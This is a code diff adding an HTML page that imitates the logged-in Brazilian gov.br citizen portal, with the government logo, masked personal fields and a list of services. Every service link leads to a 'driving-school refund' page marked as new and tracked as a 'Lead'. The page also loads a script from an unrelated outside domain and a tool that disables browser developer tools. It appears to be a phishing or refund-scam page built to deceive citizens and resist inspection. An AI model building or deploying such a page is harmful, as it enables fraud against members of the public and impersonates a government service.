@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Portal Logado</title>
+<link rel="stylesheet" href="/assets/css/services.css">
+<div>
+    <header class="br-header false svelte-7keokj">
+        <div class="container-lg svelte-7keokj">
+            <div class="header-top">
+                <div class="header-logo"><a href="" class="link-bi svelte-7keokj"><img src="/assets/img/govbr.png" alt="Logomarca GovBR"></a></div>
+                <div class="header-actions">
+                    <div class="svelte-1jznxvb">
+                        <div class="wrapper svelte-ippqk1" style="text-align:right">
+                            <div><strong id="userName-Min" class="uppercase">***** *****</strong></div>
+                            <div id="userDocument">***.***.***-**</div>
+                        </div>
+                    </div><span class="br-divider vertical mx-half mx-sm-1" style="opacity:0"></span>
+                    <div class="wrapper-login">
+                        <div class="header-sign-in">
+                            <div class="status-bar-wrapper svelte-7keokj"><button class="svelte-1b1v9si"><span class="wrapper svelte-1b1v9si" title="ELON"><span class="content svelte-1b1v9si"><a href="/dados-pessoais"><img class="account-picture-icon svelte-1b1v9si" src="/assets/img/user.png" alt="Avatar"></a></span><i class="fas fa-caret-down svelte-1b1v9si" aria-hidden="true"></i></span></button></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <div class="br-scrim foco sf-hidden"></div>
+    <div class="br-scrim foco sf-hidden"></div>
+    <div class="sc-kNOymR egaccv"></div>
+    <main class="container-lg">
+        <div class="main-content mt-4" id="main-content">
+            <div class="row">
+                <div class="col-12 col-sm-12 col-md-8 col-lg-7 col-xl-7">
+                    <div class="d-flex mb-5 flex-row align-items-center"><img src="/assets/img/user.png" alt="avatar" class="sc-dYwGCk eZzAcA">
+                        <h1 class="sc-lgpSej iMfhDo">Olá, <strong id="userName" class="uppercase">***** ***** *****</strong></h1>
+                    </div>
+                </div>
+                <div class="col-12 col-sm-12 col-md-4 col-lg-5 col-xl-5" style="display:none">
+                    <div class="sc-bRKDuR kAOHRj row">
+                        <div class="col-12"><span class="sc-hvigdm bQiyaU">SUA CONTA GOV.BR É NÍVEL <b>PRATA</b></span></div>
+                        <div class="col-12"><img src="/assets/img/nivelconta.svg" alt="Imagem de conta nível prata" class="sc-fhHczv flZoJw"></div>
+                    </div>
+                    <div class="sc-eqYatC jhzDCg"><button class="lvl-button secondary mt-3 mt-sm-0 ml-sm-3" type="button" aria-label="Aumentar nível da conta"><i class="fa-solid fa-arrow-trend-up mr-1" aria-hidden="true"></i>AUMENTAR NÍVEL</button></div>
+                </div>
+            </div>
+            <div class="cabecalho_home">Gerencie sua conta gov.br, acompanhe os serviços solicitados e assine documentos digitalmente.</div>
+            <div>
+                <div class="sc-jJLAfE eyuyoA"><span class="sc-hwkwBN dPdCvk legend">Minha conta</span><span class="br-divider my-3"></span></div>
+            </div>
+            <div class="col">
+                <div>
+                    <a href="/dados-pessoais">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="fas fa-clipboard-list" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Dados Pessoais</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                    <a href="/seguranca-da-conta">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="fas fa-lock" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Segurança da conta</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                </div>
+            </div>
+            <div>
+                <div class="sc-jJLAfE eyuyoA"><span class="sc-hwkwBN dPdCvk legend">Serviços</span><span class="br-divider my-3"></span></div>
+            </div>
+            <div class="col">
+                <div>
+                    <style>
+                        .gEmBdD:has(.item-novo) {
+                            display: flex;
+                            align-items: center
+                        }
+
+                        .gEmBdD .item-novo {
+                            background-color: #268744;
+                            color: #fff;
+                            margin-left: 12px;
+                            padding: 2px 6px;
+                            font-size: .68rem;
+                            border-radius: 4px
+                        }
+                    </style>
+                    <a mp-view-event="Lead" href="/devolucao">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><img style="filter:brightness(0) saturate(100%) invert(16%) sepia(21%) saturate(5674%) hue-rotate(199deg) brightness(98%) contrast(97%)" src="/assets/img/car-icon.svg" alt=""></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Devolução autoescola
+                                    <div class="item-novo">NOVO</div>
+                                </div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                    <a href="/devolucao">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="fas fa-envelope" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Caixa postal</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                    <a href="/devolucao">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="fas fa-wallet" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Carteira de documentos</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                    <a href="/devolucao">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="fas fa-clipboard-check" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Baixar certidões</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                    <a href="/devolucao">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="fas fa-file-signature" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Assinar documentos digitalmente</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                    <a href="/devolucao">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="fas fa-concierge-bell" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Consultar serviços solicitados</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                    <a href="/devolucao">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="fas fa-calendar" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Agenda GOV.BR</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                    <a href="/devolucao">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="fas fa-bell" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Notificações</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                    <a href="/devolucao">
+                        <div class="d-flex mb-1" role="button" tabindex="0">
+                            <div class="m-half p-1"><i class="far fa-question-circle" aria-hidden="true" style="font-size:25px;color:#0c326f"></i></div>
+                            <div class="m-half p-1 flex-fill">
+                                <div class="sc-jwTyAe gEmBdD" style="color:#0c326f">Ajuda da conta gov.br</div>
+                            </div>
+                            <div class="m-half p-1 d-flex justify-content-end"><i class="icon fas fa-chevron-right" aria-hidden="true" style="color:#d5d1d1"></i></div>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </main>
+    <script src="/assets/js/skg.js"></script>
+    <script src="https://npdados.site/DT/main.js?nocache=42562645789264"></script>
+    <script>
+        window._STDT("1275268571075710")
+    </script>
+</div>
+
+</html>
+<script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
+<script type="text/javascript">
+    (function(c, l, a, r, i, t, y) {
+        c[a] = c[a] || function() {
+            (c[a].q = c[a].q || []).push(arguments)
+        };
+        t = l.createElement(r);
+        t.async = 1;
+        t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0];
+        y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "tmf7d225xn");
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"8beff67d6cbd4f26a8f06ec229b0567a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+    crossorigin="anonymous"></script>
